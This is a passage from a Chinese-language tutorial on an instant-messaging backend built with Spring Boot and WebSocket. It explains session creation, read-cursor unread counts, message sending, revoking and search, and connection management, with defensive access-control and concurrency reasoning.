        throw new UserException("用户不存在");
    }

    // 3. 🔴 必须已是好友（安全边界，理由见第 7.3 节）
    if (!isFriend(selfUserId, toUserId)) {
        throw new UserException("对方不是你的好友，请先添加好友");
    }

    // 4. 已经有共同会话就直接复用，不重复建
    Integer existSessionId = sessionMapper.findCommonSession(selfUserId, toUserId);
    if (existSessionId != null) {
        log.info("复用已有会话：sessionId = {}", existSessionId);
        return new SessionCreateResponse(existSessionId);
    }

    // 5. 新建：1 行会话 + 2 行成员，3 次写必须同一事务，
    //    否则中途失败会留下"有会话但没成员"的脏数据
    MessageSession session = new MessageSession();
    session.setType(Constant.SESSION_TYPE_SINGLE);
    session.setLastTime(LocalDateTime.now());
    sessionMapper.insert(session);

    // MP 靠 @TableId(AUTO) 把自增主键回填到 session 对象里
    Integer sessionId = session.getSessionId();
    sessionUserMapper.insert(new MessageSessionUser(sessionId, selfUserId, 0));   // 第三个参数是已读游标
    sessionUserMapper.insert(new MessageSessionUser(sessionId, toUserId, 0));

    return new SessionCreateResponse(sessionId);
}
```

**`findCommonSession` 那条 SQL 有个必带的条件**：

```java
@Select("select msu1.session_id " +
        "from message_session_user msu1 " +
        "join message_session_user msu2 on msu1.session_id = msu2.session_id " +
        "join message_session ms on ms.session_id = msu1.session_id " +
        "where msu1.user_id = #{selfUserId} " +
        "  and msu2.user_id = #{toUserId} " +
        // 🔴 必须带 type = 1：我和张三可能既有单聊又同在一个群，
        //    群成员表里我俩都是成员，不筛类型的话这里会把群聊的 sessionId 返回，
        //    结果点"私聊张三"打开的却是群
        "  and ms.type = 1 " +
        "limit 1")
Integer findCommonSession(@Param("selfUserId") Integer selfUserId, @Param("toUserId") Integer toUserId);
```

### 8.4 未读：游标法（本项目的核心设计之一）

**先说结论**：`message_session_user` 只加一列 `last_read_message_id`，就实现了完整的未读功能。

**标记已读的 SQL**：

```java
/**
 * 把某个用户在某会话里的已读游标推到 messageId。
 * 关键在那个 and last_read_message_id < #{messageId}：
 *   · 幂等 —— 重复点同一个会话不会报错、也不会把游标推过头
 *   · 并发安全 —— 两个标签页同时上报，游标只会往前走、不会被旧值覆盖回去
 * 如果写成 "set last_read_message_id = #{messageId}"（不带条件），
 * 一个慢请求后到就会把已读位置"倒退"，用户会看到已经读完的消息又变未读。
 */
@Update("update message_session_user " +
        "set last_read_message_id = #{messageId} " +
        "where session_id = #{sessionId} " +
        "  and user_id = #{userId} " +
        "  and last_read_message_id < #{messageId}")
int markRead(@Param("userId") Integer userId,
             @Param("sessionId") Integer sessionId,
             @Param("messageId") Integer messageId);
```

```java
@Override
public void markSessionRead(Integer userId, Integer sessionId) {
    if (sessionId == null) {
        throw new UserException("会话 id 不能为空");
    }
    // sessionId 来自前端，不校验成员身份的话改个数字就能动别人的已读状态
    if (!isMember(userId, sessionId)) {
        throw new UserException("你不在这个会话里");
    }

    // 直接推到会话里当前最大的 message_id，等于"这个会话全部已读"。
    // 让后端自己查 max，而不是让前端传 message_id：
    // 前端可能拿到的是旧列表，传上来的 id 反而不准。
    Integer maxMessageId = messageMapper.selectMaxMessageId(sessionId);
    int updated = sessionUserMapper.markRead(userId, sessionId, maxMessageId);
    log.info("标记已读：userId = {}, sessionId = {}, 游标 -> {}, 影响行数 = {}",
            userId, sessionId, maxMessageId, updated);
}
```

**三个设计决策，每个都能回答一个"为什么不用另一种做法"**：

| 决策 | 如果反过来做会怎样 |
|---|---|
| **游标用 `message_id` 不用 `post_time`** | `datetime` 没有小数秒，同一秒内的多条消息"谁更大"分不出来，游标会卡住或跳过头 |
| **UPDATE 带前进守卫 `last_read_message_id < #{messageId}`** | 慢请求后到会把游标**倒退**，用户看到"读完的消息又变未读"。这个 bug 只在特定时序下出现，**最难查** |
| **让后端查 `max(message_id)`，不让前端传** | 前端传的是它本地列表里的 id，可能是旧的；而且前端拿到"最新 id"这件事本身就要多发一个请求 |

**还有一个容易忽略的细节：撤回后的消息仍然算未读**（和微信一致）。
所以未读统计的 SQL 里**有意不加 `and revoked = 0`** —— 撤回只是把内容抹掉了，那条消息**在会话历史里仍然占一个位置**。

---

## 第 9 章 · 消息模块：收发、撤回、搜索

### 9.1 历史消息

```java
/**
 * 查某个会话的历史消息。
 * 排序必须加 message_id 兜底（理由见 6.7）。
 * 已撤回的消息：case when 直接把 content 返回成 null —— 原文还在库里（方便事后核查），
 * 但既然撤回了就不该再下发到客户端。
 */
@Select("select m.message_id as messageId, " +
        "       m.from_id    as fromId, " +
        "       u.user_name  as fromName, " +
        "       m.session_id as sessionId, " +
        "       case when m.revoked = 1 then null else m.content end as content, " +
        "       m.post_time  as postTime, " +
        "       m.revoked    as revoked, " +
        "       m.type       as type " +
        "from message m " +
        "join user u on m.from_id = u.user_id " +
        "where m.session_id = #{sessionId} " +
        "order by m.post_time asc, m.message_id asc")
List<MessageResponse> selectHistoryMessage(@Param("sessionId") Integer sessionId);
```

```java
@Override
public List<MessageResponse> getHistoryMessage(Integer userId, Integer sessionId) {
    if (sessionId == null) {
        throw new UserException("会话 id 不能为空");
    }
    // 🔴 sessionId 是前端传的，不校验成员身份的话改个数字就能翻别人的聊天记录
    if (!isMember(userId, sessionId)) {
        throw new UserException("你不在这个会话里");
    }
    return messageMapper.selectHistoryMessage(sessionId);
}
```

**"撤回的内容不下发"为什么放在 SQL 里做，而不是 Java 里 `if (revoked == 1) content = null`？**

因为放在 SQL 里**更不容易漏**。这个接口以后可能被别的地方复用，而"忘记处理 revoked"的后果是
**用户能看到被撤回的原文** —— 一个直接的隐私事故。数据出库的那一刻就处理掉，最稳。

### 9.2 发消息：一条消息要经过 9 步

这是整个项目最长的一个方法，**每一步都有它存在的理由**：

```java
@Override
@Transactional(rollbackFor = Exception.class)
public void sendMessage(Integer fromUserId, Integer sessionId, String content, Integer contentType) {
    if (sessionId == null) {
        throw new UserException("会话 id 不能为空");
    }

    // ① 类型兜底：只有明确传 2 才算图片，其余一律按文本处理（老前端不传 contentType 也能用）
    int msgType = (contentType != null && contentType == Constant.MSG_TYPE_IMAGE)
            ? Constant.MSG_TYPE_IMAGE : Constant.MSG_TYPE_TEXT;
    String text = content == null ? "" : content.trim();

    if (msgType == Constant.MSG_TYPE_IMAGE) {
        // ② 图片消息的 content 必须是刚上传得到的 /upload/ 路径。
        //    不校验的话，任何人都能把任意 URL（甚至 data: / javascript: 开头的东西）
        //    塞进消息里，前端再渲染成 <img src> 就成了注入点
        if (!text.startsWith(Constant.UPLOAD_URL_PREFIX + "/")) {
            throw new UserException("图片地址不合法");
        }
    } else if (text.isEmpty()) {
        throw new UserException("消息内容不能为空");
    }

    // ③ 长度对齐 message.content 的 varchar(2048)，超了会被 MySQL 截断/报错，业务层先拦
    if (text.length() > MAX_CONTENT_LENGTH) {
        throw new UserException("内容太长了，最多 " + MAX_CONTENT_LENGTH + " 个字");
    }

    // ④ 🔴 关键安全校验：确认发送者确实在该会话里，
    //    否则改一下 sessionId 就能往别人的会话里插消息
    if (!isMember(fromUserId, sessionId)) {
        throw new UserException("你不在这个会话里");
    }

    User from = userMapper.selectById(fromUserId);
    if (from == null) {
        throw new UserException("用户不存在");
    }

    // ⑤ 消息落库（MP 会把自增主键回填到 message 对象里）
    LocalDateTime postTime = LocalDateTime.now();
    Message message = new Message();
    message.setFromId(fromUserId);
    message.setSessionId(sessionId);
    message.setContent(text);
    message.setPostTime(postTime);
    message.setType(msgType);
    messageMapper.insert(message);

    // ⑥ 会话的 last_time 顶上去，否则会话列表不会按最近聊天排序
    MessageSession session = new MessageSession();
    session.setSessionId(sessionId);
    session.setLastTime(postTime);
    sessionMapper.updateById(session);

    // ⑦ 构造推送用的 DTO
    MessageResponse dto = new MessageResponse(
            message.getMessageId(), fromUserId, from.getUserName(), sessionId, text, postTime, 0, msgType);

    // ⑧ 一次查出会话内所有成员的未读数（原来是在循环里逐个查 = N+1）
    Map<Integer, Integer> unreadByUser = new HashMap<>();
    for (UnreadCountRow row : messageMapper.selectUnreadCounts(sessionId)) {
        unreadByUser.put(row.getUserId(), row.getUnreadCount());
    }

    // ⑨ 广播给会话内所有在线成员 —— 一定要包含发送者自己！
    TxAfterCommit.run(() -> {
        for (Integer memberId : getMemberIds(sessionId)) {
            WsMessageResponse push = WsMessageResponse.ofMessage(dto);
            if (!fromUserId.equals(memberId)) {
                // 只有对方需要知道"我多了几条未读"。这一步在 insert 之后，
                // 所以数出来的未读数已经包含刚发的这条
                push.setUnreadCount(unreadByUser.getOrDefault(memberId, 0));
            }
            onlineUserManager.sendTo(memberId, push);
        }
    });

    log.info("消息已发送：messageId = {}, sessionId = {}, from = {}",
            message.getMessageId(), sessionId, fromUserId);
}
```

#### 🔴 为什么广播必须"包含发送者自己"

因为**前端不做本地回显**。`client.js` 里发消息的流程是：

```javascript
websocket.send(JSON.stringify({type: 'message', sessionId, content}));
$('#message-input').val('');          // 发完就清空输入框，没有"先渲染一条灰色的自己的消息"这一步
// 真正的渲染发生在 onmessage 收到推送时
```

于是如果广播漏掉发送者，症状就是：**你发的消息自己看不到，对方看得到**。
（"我发了但你收到了我却看不到"这种 bug，第一次遇到会怀疑是数据库查询问题。）

**统一走服务端推送还有一个好处**：多标签页、多端登录时，所有端看到的顺序和内容完全一致 ——
不会出现"手机上是 A 顺序、电脑上是 B 顺序"。

#### 🔴 未读数：为什么必须"一次 group by"而不是循环查

原来的写法是"广播前循环每个成员，查一次他的未读数"：

```java
// ❌ N+1：群里有 50 个人，发一条消息就是 50 次查询
for (Integer memberId : getMemberIds(sessionId)) {
    int unread = messageMapper.selectUnreadCount(memberId, sessionId);
    ...
}
```

改成一条 SQL 一次算出所有人：

```java
/**
 * ⚠️ 两个容易写错的地方：
 *   1. 必须 left join + count(m.message_id)。写成 count(*) 的话，
 *      没有未读的成员会因为 left join 补出一行 NULL 而被算成 1 条未读。
 *   2. 过滤条件只能写在 on 里。写到 where 会把 left join 退化成 inner join，
 *      同样让"0 未读"的人直接消失（他就永远收不到推送了）。
 */
@Select("select msu.user_id as userId, " +
        "       count(m.message_id) as unreadCount " +
        "from message_session_user msu " +
        "left join message m " +
        "  on m.session_id = msu.session_id " +
        " and m.from_id <> msu.user_id " +
        " and m.message_id > msu.last_read_message_id " +
        "where msu.session_id = #{sessionId} " +
        "group by msu.user_id")
List<UnreadCountRow> selectUnreadCounts(@Param("sessionId") Integer sessionId);
```

**这两个坑的形式完全一样，但表现相反**：

| 写错的方式 | 后果 |
|---|---|
| `count(*)` 而不是 `count(m.message_id)` | 所有人都被算成至少 1 条未读（红点永远不消失） |
| 条件写在 `where` 而不是 `on` | "0 未读"的成员**从结果集里消失** → 他收不到这条推送 → **消息不实时了** |

**记住一个口诀**：

> `left join` + 过滤条件写 `on` 里 + `count(被 join 表的列)` —— 这三件事必须一起做，
> 少任何一件，"数量为 0 的行"就会出问题。

### 9.3 撤回：软删除 + 两道闸

```java
@Override
@Transactional(rollbackFor = Exception.class)
public void revokeMessage(Integer userId, Integer messageId) {
    if (messageId == null) {
        throw new UserException("消息 id 不能为空");
    }

    // ===== 第一道闸：先查出来做精确校验 =====
    // 之所以不直接跑 UPDATE 看影响行数，是因为"影响行数为 0"有 4 种可能
    // （不存在 / 不是你的 / 已撤过 / 超时），只回一句"撤回失败"用户根本不知道怎么办
    Message message = messageMapper.selectById(messageId);
    if (message == null) {
        throw new UserException("消息不存在");
    }
    if (!userId.equals(message.getFromId())) {
        throw new UserException("只能撤回自己发的消息");
    }
    if (message.getRevoked() != null && message.getRevoked() == 1) {
        throw new UserException("这条消息已经撤回了");
    }
    if (message.getPostTime() == null) {
        throw new UserException("消息时间异常，无法撤回");
    }
    // 🔴 时间窗口只认服务端时间。前端那个按钮的显示与否只是体验，不作数
    LocalDateTime deadline = LocalDateTime.now().minusMinutes(Constant.REVOKE_WINDOW_MINUTES);
    if (message.getPostTime().isBefore(deadline)) {
        throw new UserException("超过 " + Constant.REVOKE_WINDOW_MINUTES + " 分钟的消息不能撤回");
    }

    // ===== 第二道闸：带条件更新 =====
    // 上面是"读"、这里是"写"，中间隔着时间窗：两个标签页同时点撤回会双双通过校验，
    // 只有这条带条件的 UPDATE 能保证只有一次真正生效（返回 0 行的那次就是抢输了）
    int updated = messageMapper.revokeMessage(messageId, userId, deadline);
    if (updated == 0) {
        throw new UserException("撤回失败，消息状态已变化，请刷新后重试");
    }

    // ===== 广播给会话内所有人（含撤回者自己）=====
    // 前端不在这里本地改界面，统一等这条推送 —— 多标签页/多端才一致
    User from = userMapper.selectById(userId);
    WsMessageResponse push = WsMessageResponse.ofRevoke(
            messageId, message.getSessionId(), userId, from == null ? "未知用户" : from.getUserName());
    TxAfterCommit.run(() -> {
        for (Integer memberId : getMemberIds(message.getSessionId())) {
            onlineUserManager.sendTo(memberId, push);
        }
    });
}
```

配套的带条件 UPDATE：

```java
/**
 * 把消息标记成已撤回。
 * where 里那三个条件不是重复劳动，而是【防并发的最后一道闸】：
 *   · from_id   = #{userId}     —— 只能撤自己发的
 *   · revoked   = 0             —— 已经撤过的不能再撤（幂等）
 *   · post_time >= #{deadline}  —— 超过 2 分钟的不给撤
 * @return 影响行数，0 表示没撤成功（不存在 / 不是你的 / 已撤过 / 超时）
 */
@Update("update message set revoked = 1 " +
        "where message_id = #{messageId} " +
        "  and from_id = #{userId} " +
        "  and revoked = 0 " +
        "  and post_time >= #{deadline}")
int revokeMessage(@Param("messageId") Integer messageId,
                  @Param("userId") Integer userId,
                  @Param("deadline") LocalDateTime deadline);
```

#### 为什么是"两道闸"而不是一道？

**只留读校验**：两个标签页同时点撤回 —— 两边都通过了 `select` 校验（此时都还是 `revoked = 0`），
然后都执行 `update set revoked = 1`，**两次都"成功"**，广播也发两遍。

**只留带条件 UPDATE**：能防并发，但用户只会看到一句"撤回失败"，
**不知道为什么失败**（消息不存在？不是我的？超时了？）—— 这类"什么都不能做"的报错最让人恼火。

**两道合起来**：读校验负责**给出人能看懂的原因**，写校验负责**保证并发正确**。
这是"用户体验"和"数据正确性"各司其职的典型分工。

#### 撤回的三个附加决策

| 决策 | 理由 |
|---|---|
| **软删除而不是物理 delete** | 要留"XX 撤回了一条消息"的痕迹；超时校验需要查得到原 `post_time` |
| **窗口只认服务端时间** | 用户改系统时间、多端时钟不一致都不影响判断。前端的 `REVOKE_WINDOW_MS` 只决定"要不要显示撤回按钮" |
| **前端两个常量必须同步改** | `Constant.REVOKE_WINDOW_MINUTES`（后端，说了算）和 `client.js` 的 `REVOKE_WINDOW_MS`（前端，只管体验）—— 改一个忘一个，会出现"按钮能点但请求被拒" |

### 9.4 消息搜索：JOIN 就是安全边界

```java
@Select("select m.message_id as messageId, m.from_id as fromId, u.user_name as fromName, " +
        "       m.session_id as sessionId, m.content as content, m.post_time as postTime, " +
        "       ms.type as sessionType, " +
        // 会话名：群聊取群名，单聊取"对方的名字"
        "       coalesce(ms.name, " +
        "                (select u2.user_name from message_session_user msu2 " +
        "                   join user u2 on u2.user_id = msu2.user_id " +
        "                  where msu2.session_id = ms.session_id " +
        "                    and msu2.user_id <> #{userId} " +
        "                  limit 1)) as sessionName " +
        "from message m " +
        "join message_session ms on ms.session_id = m.session_id " +
        "join user u on u.user_id = m.from_id " +
        // 🔴🔴 这一句是【安全边界本身】，不是可选优化：
        //      只有"我确实是成员"的会话里的消息才会被 join 出来，所以搜不到别人的聊天
        "join message_session_user msu " +
        "  on msu.session_id = m.session_id and msu.user_id = #{userId} " +
        "where m.content like concat('%', #{keyword}, '%') " +
        "  and m.revoked = 0 " +   // 已撤回的不该被搜出来，否则撤回就白撤了
        "  and m.type = 1 " +      // 只搜文本；图片消息的 content 是文件路径，搜出来没意义
        "order by m.post_time desc, m.message_id desc " +
        "limit 100")              // 别让一次搜索把整张表拖回来（真实项目这里要分页）
List<MessageSearchResponse> selectSearchMessage(@Param("userId") Integer userId,
                                                @Param("keyword") String keyword);
```

**这段 SQL 最值得学的是那个 join 的定位**：

> 它是**权限控制**，不是"查询优化"。
> 两种写法的安全性完全不同：
>
> ```java
> // ❌ 权限放在 where 里：以后有人重构查询、把 where 拆开，就可能漏掉这一句
> where msu.user_id = #{userId}
> ```
>
> 而写成 `join 条件的一部分` 之后，**"能查到某条消息"这件事本身就意味着"我是这条会话的成员"** ——
> 权限不是"额外加的一层检查"，而是"数据可见性的定义"。这类写法不需要任何人记得写 `where`。

Service 层对应就很薄 —— **因为不需要再校验什么**：

```java
@Override
public List<MessageSearchResponse> searchMessage(Integer userId, String keyword) {
    if (!StringUtils.hasText(keyword)) {
        throw new UserException("搜索内容不能为空");
    }
    String trimmed = keyword.trim();
    if (trimmed.length() > MAX_KEYWORD_LENGTH) {      // 50 字，防止有人拿超长字符串怼 like
        throw new UserException("搜索内容太长了，最多 " + MAX_KEYWORD_LENGTH + " 个字");
    }
    // 权限隔离在 SQL 的 join 里做，这里不用再校验
    return messageMapper.selectSearchMessage(userId, trimmed);
}
```

### 9.5 图片消息：上传和发送分两步

**分成两步是刻意的设计**：

```
第一步（HTTP）：POST /message/image  ── multipart 上传文件 ──→ 返回 {"url": "/upload/chat/4_ab12cd34ef56.png"}
第二步（WebSocket）：{type:'message', sessionId, content: url, contentType: 2}
```

**为什么不在 WebSocket 里传二进制？**

- **能立刻知道失败原因**：图片太大、格式不支持，HTTP 直接返回 400 + 人话；走 WS 只能收到一个 `type:error`
- **上传有进度、可重试**：`XMLHttpRequest` 有 `progress` 事件，WS 没有
- **WS 帧不适合传大 payload**：多数代理对单帧大小有限制

**Controller**：

```java
@PostMapping("/message/image")
public Map<String, String> uploadImage(HttpServletRequest request,
                                       @RequestParam("file") MultipartFile file) {
    Integer userId = (Integer) request.getAttribute(Constant.CURRENT_USER_ID);
    return Map.of("url", messageService.uploadImage(userId, file));
}
```

**发送端要校验 content 是 `/upload/` 开头**（见 9.2 步骤 ②）——
不校验的话，任何人都能把 `javascript:` 或任意外链塞进消息，前端渲染成 `<img src>` 就成了注入点。

**推送信封里必须带 `contentType`**（这条很容易漏）：

```java
public static WsMessageResponse ofMessage(MessageResponse message) {
    WsMessageResponse resp = new WsMessageResponse();
    resp.setType(Constant.WS_TYPE_MESSAGE);
    resp.setMessageId(message.getMessageId());
    resp.setFromId(message.getFromId());
    resp.setFromName(message.getFromName());
    resp.setSessionId(message.getSessionId());
    resp.setContent(message.getContent());
    resp.setPostTime(message.getPostTime());
    resp.setContentType(message.getType());     // 🔴 不能省
    return resp;
}
```

> 省掉的后果：接收方只拿到 `content = "/upload/chat/xxx.png"`，**前端没有任何依据判断它是图片**，
> 会把这串路径当文本直接显示出来 —— 用户看到一条写着文件路径的消息。
>
> 还有一层：**WebSocket 推送里的 `contentType` 是数字**，而历史消息接口里的字段叫 `type`，也是数字。
> 前端判断"是不是图片"必须用 `contentType ?? type`（优先取推送的字段），只认一个就会有一边显示错。

---

## 第 10 章 · WebSocket 深度篇（本项目最核心的一章）

**这一章是"课件没讲、但线上一定会遇到"的部分。** 如果前面几章是"怎么把功能做出来"，
这一章是"怎么让它 7×24 小时不坏"。

### 10.1 第一件事：用 Spring 原生，别用 `@ServerEndpoint`

```java
// ❌ JSR-356 的写法 —— 本项目不用
@ServerEndpoint("/ws/message")
@Component
public class MyEndpoint {
    @Autowired
    private MessageService messageService;   // 永远是 null！
}
```

**为什么是 null**：`@ServerEndpoint` 标注的类，**实例由 Tomcat（Servlet 容器）创建**，不归 Spring 管。
容器只负责 new 一个对象出来，不会做依赖注入。绕过去的办法（静态字段、`ApplicationContextAware`）
都是自找麻烦。

**所以用 Spring 原生那套**：`WebSocketConfigurer` + `TextWebSocketHandler`，
处理器是普通的 Spring Bean，**构造器注入正常工作**：

```java
@Configuration
@EnableWebSocket
@EnableScheduling        // 为了 WebSocketIdleReaper 的定时扫描
public class WebSocketConfig implements WebSocketConfigurer {

    @Override
    public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
        registry.addHandler(messageWebSocketHandler, Constant.WS_MESSAGE_PATH)
                .addInterceptors(authHandshakeInterceptor)   // 握手鉴权
                .setAllowedOriginPatterns("*");              // 本地开发放行跨域；上线换具体域名
    }
}
```

### 10.2 握手鉴权：token 只能挂 URL query

**浏览器原生 `new WebSocket(url)` 不支持自定义请求头** —— `User-Token` 那套在这里用不了。
所以：

```
ws://101.42.2.204:8082/ws/message?token=eyJhbGciOi...
```

```java
@Component
public class AuthHandshakeInterceptor implements HandshakeInterceptor {

    @Override
    public boolean beforeHandshake(ServerHttpRequest request, ServerHttpResponse response,
                                   WebSocketHandler wsHandler, Map<String, Object> attributes) {
        String token = parseToken(request.getURI());
        if (!StringUtils.hasText(token)) {
            return reject(response, "未登录，请先登录");
        }

        Claims claims = jwtUtil.parseJwt(token);
        if (claims == null) {
            return reject(response, "登录已过期，请重新登录");
        }

        Object idObj = claims.get(Constant.JWT_CLAIM_ID);
        if (idObj == null) {
            return reject(response, "登录态异常，请重新登录");
        }

        // 塞进 WebSocketSession 的 attributes，端点在 handleTextMessage 里能直接取
        attributes.put(Constant.CURRENT_USER_ID, Integer.valueOf(idObj.toString()));
        attributes.put(Constant.CURRENT_USER_NAME, claims.get(Constant.JWT_CLAIM_NAME, String.class));
        log.info("WebSocket 握手通过：userId = {}", idObj);
        return true;
    }

    private boolean reject(ServerHttpResponse response, String message) {
        response.setStatusCode(HttpStatus.UNAUTHORIZED);
        response.getHeaders().setContentType(MediaType.APPLICATION_JSON);
        try {
            response.getBody().write(("{\"code\":401,\"message\":\"" + message + "\"}").getBytes(StandardCharsets.UTF_8));
        } catch (IOException e) {
            log.warn("写握手失败响应出错：{}", e.getMessage());
        }
        return false;
    }

    /**
     * 从 query 里取 token。
     * 手写而不用 UriComponentsBuilder：getURI() 拿到的是原始（已编码）URI，
     * UriComponentsBuilder 的 build() / build(encoded) 语义容易搞反，
     * 直接对 rawQuery 做 URLDecoder.decode 最稳妥。
     */
    private String parseToken(URI uri) {
        String rawQuery = uri.getRawQuery();
        if (!StringUtils.hasText(rawQuery)) return null;
        for (String pair : rawQuery.split("&")) {
            int idx = pair.indexOf('=');
            if (idx > 0 && Constant.WS_TOKEN_PARAM.equals(pair.substring(0, idx))) {
                return URLDecoder.decode(pair.substring(idx + 1), StandardCharsets.UTF_8);
            }
        }
        return null;
    }
}
```

> 🔴 **别忘了 `WebConfig` 里放行 `/ws/**`**。
> 理由反直觉但很关键：**握手请求在 MVC 眼里也是一次普通 HTTP 请求**，
> 不放行的话会被登录拦截器判 401 —— 而它头里根本没有 `User-Token`，**永远不可能通过**。
> 症状是"WebSocket 一直连不上，浏览器控制台报握手 401"。

### 10.3 OnlineUserManager：在线连接表

**这是整个 WebSocket 部分的心脏。** 一个类 200 行，几乎每一行都在处理并发和自愈。

```java
@Slf4j
@Component
public class OnlineUserManager {

    /**
     * 🔴 value 是 Set 而不是单个 session：同一个用户可能开着多个标签页，
     * 每个标签页都是一条独立连接，只存一个会把前面的连接"顶掉"、后面的收不到推送。
     */
    private final Map<Integer, Set<WebSocketSession>> onlineSessions = new ConcurrentHashMap<>();

    private final ObjectMapper objectMapper;

    /**
     * 必须用 Spring 容器里的 ObjectMapper。
     * 自己 new ObjectMapper() 没有注册 JavaTimeModule，
     * 序列化 LocalDateTime（postTime 字段）时会直接抛 InvalidDefinitionException。
     */
    public OnlineUserManager(ObjectMapper objectMapper) {
        this.objectMapper = objectMapper;
    }
```

#### 10.3.1 上线 / 保活

```java
    public void add(Integer userId, WebSocketSession session) {
        if (userId == null || session == null) return;
        onlineSessions.computeIfAbsent(userId, k -> ConcurrentHashMap.newKeySet()).add(session);
        touch(session);
        log.info("用户上线：userId = {}, 当前在线连接数 = {}", userId, sessionCount());
    }

    /**
     * 标记"这条连接刚刚还活着"。每收到一帧就调一次（客户端心跳 25s 一次，顺带就把时间刷了）。
     * 时间戳直接存在 session.getAttributes() 里，而不是另开一张 Map 去维护 ——
     * 少一份和 Set 同步的状态，就少一处能被写歪的地方；连接被摘掉时时间戳跟着一起消失。
     */
    public void touch(WebSocketSession session) {
        if (session == null) return;
        try {
            session.getAttributes().put(Constant.WS_SESSION_LAST_ACTIVE, System.currentTimeMillis());
        } catch (Exception e) {
            // 连接刚好在这会儿被关掉，attributes 可能已经不可写 —— 只是少一次刷新，不必惊动调用方
            log.debug("刷新连接活跃时间失败：{}", e.getMessage());
        }
    }

    /** 该连接最后一次活跃的时间；拿不到就当成"就是现在"，避免误杀 */
    private long lastActiveAt(WebSocketSession session) {
        Object v = session.getAttributes().get(Constant.WS_SESSION_LAST_ACTIVE);
        return (v instanceof Long l) ? l : System.currentTimeMillis();
    }
```

**"时间戳存在 `session.getAttributes()` 里"这个细节值得展开**：

如果用一张额外的 `Map<sessionId, Long>` 来记活跃时间，就多了一份需要和 `onlineSessions` 同步的状态 ——
**两份状态一定会在某个并发时刻不同步**。而存在 `session` 自己身上，连接被摘除时时间戳自然消失，**不存在要清理的残留**。

#### 10.3.2 下线：一个真实的竞态

```java
    /**
     * 摘掉一条连接。
     * ⚠️ 必须用 computeIfPresent 把「移除连接」和「清掉空的 map entry」做成【一次原子操作】。
     * 原来拆成三步：
     *     sessions.remove(session);
     *     if (sessions.isEmpty()) onlineSessions.remove(userId);   // ← 不是原子的
     * 多标签页同时刷新时会出现经典竞态：
     *   A 删掉最后一个 session、判断 isEmpty 得到 true 的瞬间，
     *   B 往同一个 Set 里 add 了新连接，紧接着 A 把整个 map entry 删掉 ——
     * 结果【B 的连接还活着，用户却被标记成离线，永久收不到任何推送】（直到他再刷新一次页面）。
     */
    public void remove(Integer userId, WebSocketSession session) {
        if (userId == null || session == null) return;
        onlineSessions.computeIfPresent(userId, (k, sessions) -> {
            sessions.remove(session);
            return sessions.isEmpty() ? null : sessions;   // 返回 null = 删掉这个 key
        });
        if (!onlineSessions.containsKey(userId)) {
            log.info("用户下线：userId = {}, 当前在线连接数 = {}", userId, sessionCount());
        }
    }
```

**这个竞态值得反复读**。它的可怕之处在于：

- **复现条件很"日常"**：用户在手机上刷新页面（旧连接 close + 新连接 open 几乎同时发生）
- **症状很不直观**：连接明明活着、`isOpen()` 是 true，但服务端"认为他离线"，**所有推送都静默丢失**
- **排查困难**：日志里能看到"用户下线"，但用户说自己在线 —— 你会先怀疑前端

**修法就是"把两步合成一次原子操作"**：`computeIfPresent` 的 lambda 在同一把锁内完成"移除元素"和"判断是否该删 key"。

#### 10.3.3 推送：线程安全 + 死连接自愈

```java
    /**
     * 给指定用户推送一条消息。
     * @return 是否至少成功发出一条；用户不在线（或所有连接都已断）返回 false
     */
    public boolean sendTo(Integer userId, Object payload) {
        Set<WebSocketSession> sessions = onlineSessions.get(userId);
        if (sessions == null || sessions.isEmpty()) return false;

        String json;
        try {
            json = objectMapper.writeValueAsString(payload);
        } catch (JsonProcessingException e) {
            log.error("推送内容序列化失败", e);
            return false;
        }

        TextMessage textMessage = new TextMessage(json);
        boolean sent = false;
        List<WebSocketSession> dead = null;   // 已关掉的连接先收集，循环结束后统一摘掉

        for (WebSocketSession session : sessions) {
            if (!session.isOpen()) {
                // ⚠️ 不能只 continue 就完事。清除死连接的唯一时机本来是 afterConnectionClosed，
                //    一旦它因为异常没被回调，这个 session 就会永久留在 Set 里 ——
                //    既占内存，又让 isOnline() 永远返回 true。所以顺手在这里自愈一次。
                if (dead == null) dead = new ArrayList<>();
                dead.add(session);
                continue;
            }
            // 🔴 WebSocketSession.sendMessage 不是线程安全的：同一个连接上并发发送会抛
            //    "The remote endpoint was in state [TEXT_PARTIAL_WRITING]"，
            //    所以对同一个 session 加锁串行化
            synchronized (session) {
                try {
                    session.sendMessage(textMessage);
                    sent = true;
                } catch (IOException | IllegalStateException e) {
                    log.warn("推送失败：userId = {}, 原因 = {}", userId, e.getMessage());
                    if (dead == null) dead = new ArrayList<>();
                    dead.add(session);
                }
            }
        }

        if (dead != null) {
            for (WebSocketSession session : dead) {
                remove(userId, session);
            }
        }
        return sent;
    }
```

**这一段有三个"不写就等着出事"的点**：

| 点 | 不写的后果 |
|---|---|
| `synchronized (session)` | 同一个用户两个标签页 + 并发推送时抛 `TEXT_PARTIAL_WRITING` 异常，消息发不出去 |
| 顺手 prune 死连接 | 死连接永久留在 Set 里 → 内存只涨不降 + `isOnline()` 撒谎 |
| `dead` 收集后再删，而不是在遍历里删 | `ConcurrentHashMap` 的 keySet 是弱一致的，边遍历边删虽然不抛异常，但**读起来很吓人**，而且会漏掉部分元素 |

### 10.4 MessageWebSocketHandler：端点实现的三个细节

```java
@Slf4j
@Component
public class MessageWebSocketHandler extends TextWebSocketHandler {

    @Override
    public void afterConnectionEstablished(WebSocketSession session) throws Exception {
        Integer userId = currentUserId(session);
        if (userId == null) {
            // 正常情况下 HandshakeInterceptor 已经拦掉了，这里只是兜底
            log.warn("WebSocket 连接缺少 userId，直接关闭");
            session.close(CloseStatus.NOT_ACCEPTABLE);
            return;
        }
        onlineUserManager.add(userId, session);
    }

    @Override
    protected void handleTextMessage(WebSocketSession session, TextMessage message) {
        Integer userId = currentUserId(session);
        if (userId == null) return;

        // 🔴 收到任何一帧就刷新活跃时间。这是空闲回收唯一的"活着"信号来源，
        //    所以必须放在最前面 —— 放在校验之后的话，心跳以外的非法请求就白发了，
        //    而客户端恰好只发那两种（心跳 + 消息）
        onlineUserManager.touch(session);

        try {
            WsMessageRequest request = objectMapper.readValue(message.getPayload(), WsMessageRequest.class);

            // 心跳：客户端每 25s 发一次。只回一个 pong 就返回，不进业务层、不落库、不广播。
            // 不打日志 —— 一个在线用户每分钟两条，打了会把日志冲得没法看
            if (Constant.WS_TYPE_PING.equals(request.getType())) {
                onlineUserManager.sendTo(userId, WsMessageResponse.ofPong());
                return;
            }

            if (!Constant.WS_TYPE_MESSAGE.equals(request.getType())) {
                log.warn("忽略未知的 WebSocket 指令：{}", request.getType());
                return;
            }
